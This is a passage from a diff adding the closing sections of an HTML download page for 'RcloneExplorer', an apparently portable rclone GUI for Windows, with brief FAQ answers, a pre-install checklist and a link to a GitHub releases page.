+    <p>Simply start the same transfer again. Files already copied are recognised and skipped, so a second run usually finishes quickly and does not duplicate anything.</p>
+    <h3>I cannot find where my settings are stored</h3>
+    <p>Everything lives in the folder you placed the application in. Keep that folder in the same location and your accounts and preferences will be waiting next time you open it.</p>
+  </section>
+
+  <section class="card">
+    <h2>📋 A Quick Checklist Before You Start</h2>
+    <ul>
+      <li>You are using a Windows 10 or Windows 11 computer.</li>
+      <li>You know the email address and password for the cloud account you want to connect.</li>
+      <li>You have enough free space on your PC if you plan to copy files down to your local drive.</li>
+      <li>You have bookmarked the official releases page so future updates are easy to find.</li>
+    </ul>
+    <p class="center">
+      <a class="cta small" href="https://github.com/Vikkysurmounted714/RcloneExplorer/releases">⬇️ Download RcloneExplorer Now</a>
+    </p>
+    <p style="text-align:center;font-size:0.9rem;color:#64748b;margin-bottom:0;">Visit this link to download the application.</p>
+  </section>
+
+  <footer>
+    RcloneExplorer — a modern, portable rclone GUI for Windows 10 and 11.
+  </footer>
+
+</div>
 </body>
 </html>
